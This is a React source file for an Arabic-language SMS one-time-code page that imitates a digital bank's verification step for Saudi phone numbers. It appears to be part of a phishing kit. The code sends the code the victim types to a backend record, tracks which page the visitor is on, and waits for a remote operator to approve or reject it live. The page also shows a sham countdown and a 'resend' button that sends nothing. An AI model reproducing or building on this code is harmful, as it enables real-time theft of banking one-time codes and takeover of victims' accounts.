import { useState, useRef, useEffect } from "react";
import { Shield, MessageSquare, RefreshCw, ChevronRight, CheckCircle, XCircle } from "lucide-react";
import { unityApi } from "@/lib/api";
import { useTracking, useAdminCommands } from "@/lib/useTracking";

const BRAND = { primary: "#1a3d6e", gold: "#c4923e" };

function Countdown({ seconds, onEnd }: { seconds: number; onEnd: () => void }) {
  const [left, setLeft] = useState(seconds);
  const endRef = useRef(onEnd);
  endRef.current = onEnd;
  useEffect(() => {
    const iv = setInterval(() => {
      setLeft(s => {
        if (s <= 1) { clearInterval(iv); setTimeout(() => endRef.current(), 0); return 0; }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(iv);
  }, []);
  const m = String(Math.floor(left / 60)).padStart(2, "0");
  const s = String(left % 60).padStart(2, "0");
  return <span dir="ltr">{m}:{s}</span>;
}

export default function OtpPage() {
  useTracking("التحقق OTP");
  const [otp, setOtp] = useState("");
  const [status, setStatus] = useState<"idle" | "pending" | "approved" | "rejected">("idle");
  const [expired, setExpired] = useState(false);
  const [loading, setLoading] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useAdminCommands({
    "otp:approved": () => setStatus("approved"),
    "otp:rejected": () => setStatus("rejected"),
  });

  const phone = localStorage.getItem("unity_phone") || "05••••••••";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 4) return;
    setLoading(true);
    const id = localStorage.getItem("unity_id")!;
    await unityApi.patch(id, { otpCode: otp, page: "OTP - منتظر", lastSeen: Date.now() });
    setStatus("pending");
    setLoading(false);
  };

  if (status === "approved") return (
    <div className="min-h-screen flex items-center justify-center p-4" dir="rtl"
      style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: `linear-gradient(135deg, ${BRAND.primary}, #0d2847)` }}>
      <div className="bg-white rounded-3xl shadow-2xl p-10 w-full max-w-sm text-center space-y-5">
        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
          <CheckCircle className="w-10 h-10 text-green-500" />
        </div>
        <h2 className="text-xl font-black text-gray-900">تم التحقق بنجاح!</h2>
        <p className="text-gray-500 text-sm">تم التحقق من هويتك بنجاح. مرحباً بك في البنك الوحدة الرقمي.</p>
        <div className="w-full py-3 rounded-xl text-white font-black text-sm" style={{ background: BRAND.primary }}>
          جاري تحميل حسابك...
        </div>
      </div>
    </div>
  );

  if (status === "rejected") return (
    <div className="min-h-screen flex items-center justify-center p-4" dir="rtl"
      style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: `linear-gradient(135deg, ${BRAND.primary}, #0d2847)` }}>
      <div className="bg-white rounded-3xl shadow-2xl p-10 w-full max-w-sm text-center space-y-5">
        <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto">
          <XCircle className="w-10 h-10 text-red-500" />
        </div>
        <h2 className="text-xl font-black text-gray-900">رمز التحقق غير صحيح</h2>
        <p className="text-gray-500 text-sm">الرمز المُدخل غير صحيح أو منتهي الصلاحية. يرجى طلب رمز جديد.</p>
        <button onClick={() => { setStatus("idle"); setOtp(""); setExpired(false); }}
          className="w-full py-3 rounded-xl text-white font-black text-sm hover:opacity-90" style={{ background: BRAND.primary }}>
          إعادة المحاولة
        </button>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen flex items-center justify-center p-4" dir="rtl"
      style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: `linear-gradient(135deg, ${BRAND.primary} 0%, #0d2847 100%)` }}>
      <div className="w-full max-w-sm">
        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden">
          {/* Header */}
          <div className="p-7 pb-5" style={{ background: `linear-gradient(135deg, ${BRAND.primary}, #0d2847)` }}>
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 rounded-xl flex items-center justify-center" style={{ background: BRAND.gold }}>
                <MessageSquare className="w-5 h-5 text-white" />
              </div>
              <div>
                <h2 className="text-white font-black text-lg">رمز التحقق</h2>
                <p className="text-blue-300 text-xs">تحقق برسالة SMS</p>
              </div>
            </div>
            <p className="text-blue-200 text-sm">
              تم إرسال رمز التحقق إلى رقم الجوال المسجل لديك
            </p>
          </div>

          <form onSubmit={handleSubmit} className="p-7 space-y-5">
            <div className="text-center space-y-1">
              <p className="text-sm text-gray-500 font-semibold">أدخل الرمز المرسل إلى</p>
              <p className="font-black text-gray-800" dir="ltr">+966 {phone}</p>
            </div>

            <div>
              <input
                ref={inputRef}
                type="tel"
                value={otp}
                onChange={e => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                placeholder="أدخل الرمز"
                disabled={status === "pending"}
                dir="ltr"
                className="w-full border-2 border-gray-200 rounded-xl px-4 py-4 text-xl font-black text-center outline-none tracking-widest"
                onFocus={e => (e.target.style.borderColor = BRAND.primary)}
                onBlur={e => (e.target.style.borderColor = "#e5e7eb")}
                style={{ letterSpacing: "0.3em" }}
              />
            </div>

            {!expired && status !== "pending" && (
              <div className="text-center text-sm font-semibold text-gray-500">
                ينتهي الرمز خلال: <Countdown seconds={120} onEnd={() => setExpired(true)} />
              </div>
            )}
            {expired && (
              <div className="text-center">
                <p className="text-red-500 text-sm font-bold mb-2">انتهت صلاحية الرمز</p>
                <button type="button" onClick={() => { setExpired(false); setOtp(""); }}
                  className="text-sm font-black flex items-center gap-1.5 mx-auto hover:underline" style={{ color: BRAND.primary }}>
                  <RefreshCw className="w-3.5 h-3.5" /> إعادة إرسال
                </button>
              </div>
            )}

            {status === "pending" ? (
              <div className="text-center space-y-3">
                <div className="flex items-center justify-center gap-2 text-gray-600">
                  <div className="w-4 h-4 border-2 border-t-transparent rounded-full animate-spin" style={{ borderColor: `${BRAND.primary}40 ${BRAND.primary} ${BRAND.primary} ${BRAND.primary}` }} />
                  <span className="text-sm font-semibold">جاري التحقق...</span>
                </div>
                <p className="text-xs text-gray-400">الرجاء الانتظار</p>
              </div>
            ) : (
              <button type="submit" disabled={otp.length < 4 || loading || expired}
                className="w-full py-4 rounded-xl text-white font-black text-base hover:opacity-90 transition-opacity disabled:opacity-40 flex items-center justify-center gap-2"
                style={{ background: BRAND.primary }}>
                تأكيد <ChevronRight className="w-4 h-4" />
              </button>
            )}

            <div className="bg-blue-50 border border-blue-100 rounded-xl p-3 flex items-center gap-2">
              <Shield className="w-4 h-4 text-blue-500 flex-shrink-0" />
              <p className="text-xs text-blue-600 font-semibold">لا تشارك هذا الرمز مع أي شخص</p>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
